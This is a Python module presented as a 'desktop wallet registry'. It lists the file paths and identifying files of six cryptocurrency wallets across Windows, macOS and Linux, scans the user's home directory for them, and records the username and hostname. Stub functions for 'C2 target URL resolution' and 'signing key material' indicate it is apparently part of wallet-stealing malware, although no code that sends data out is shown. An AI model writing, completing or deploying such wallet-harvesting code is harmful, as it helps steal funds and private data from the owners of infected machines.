# -*- coding: utf-8 -*-
"""Desktop wallet registry — known wallet paths, signatures, and platform detection."""

import os
import platform
import struct
import sys
from pathlib import Path


DESKTOP_WALLETS = {
    "Exodus": {
        "Windows": "AppData/Roaming/Exodus/exodus.wallet",
        "Darwin": "Library/Application Support/Exodus/exodus.wallet",
        "Linux": ".config/Exodus/exodus.wallet",
        "signatures": ["exodus.conf", "backup.pem"],
    },
    "Electrum": {
        "Windows": "AppData/Roaming/Electrum/wallets",
        "Darwin": "Library/Application Support/Electrum/wallets",
        "Linux": ".electrum/wallets",
        "signatures": ["*.json"],
    },
    "Atomic Wallet": {
        "Windows": "AppData/Roaming/atomic/Local Storage",
        "Darwin": "Library/Application Support/atomic/Local Storage",
        "Linux": ".config/atomic/Local Storage",
        "signatures": ["leveldb"],
    },
    "Jaxx Liberty": {
        "Windows": "AppData/Roaming/Jaxx/Local Storage",
        "Darwin": "Library/Application Support/Jaxx/Local Storage",
        "Linux": ".config/Jaxx/Local Storage",
        "signatures": ["leveldb", "LOCK"],
    },
    "Guarda": {
        "Windows": "AppData/Roaming/Guarda",
        "Darwin": "Library/Application Support/Guarda",
        "Linux": ".config/Guarda",
        "signatures": ["guarda-wallet.dat"],
    },
    "Coinomi": {
        "Windows": "AppData/Roaming/Coinomi/Coinomi/wallets",
        "Darwin": "Library/Application Support/Coinomi/Coinomi/wallets",
        "Linux": ".config/Coinomi/Coinomi/wallets",
        "signatures": ["*.wallet"],
    },
}


def host_info():
    """Return system information dict."""
    return {
        "os": platform.system(),
        "arch": platform.machine(),
        "python": sys.version.split()[0],
        "bits": struct.calcsize("P") * 8,
        "user": os.getlogin() if hasattr(os, "getlogin") else "unknown",
        "hostname": platform.node(),
    }


def meets_requirements():
    """Check if the system meets minimum requirements."""
    if sys.version_info < (3, 10):
        return False
    return True


def arch_tag():
    """Return architecture tag: x64, x86, arm64."""
    machine = platform.machine().upper()
    if machine in ("AMD64", "X86_64"):
        return "x64"
    elif machine in ("X86", "I386", "I686"):
        return "x86"
    elif machine in ("ARM64", "AARCH64"):
        return "arm64"
    return machine.lower()


def is_compatible():
    """Check platform compatibility."""
    system = platform.system()
    return system in ("Windows", "Darwin", "Linux")


def scan_desktop_wallets():
    """Scan for known desktop wallets on the current system."""
    system = platform.system()
    home = Path.home()
    found = []

    for wallet_name, info in DESKTOP_WALLETS.items():
        rel_path = info.get(system)
        if not rel_path:
            continue
        full_path = home / rel_path
        if full_path.exists():
            found.append({
                "name": wallet_name,
                "path": str(full_path),
                "signatures": info["signatures"],
            })

    return found


def target_url():
    """Placeholder for C2 target URL resolution."""
    return ""


def signing_material():
    """Placeholder for signing key material."""
    return b""
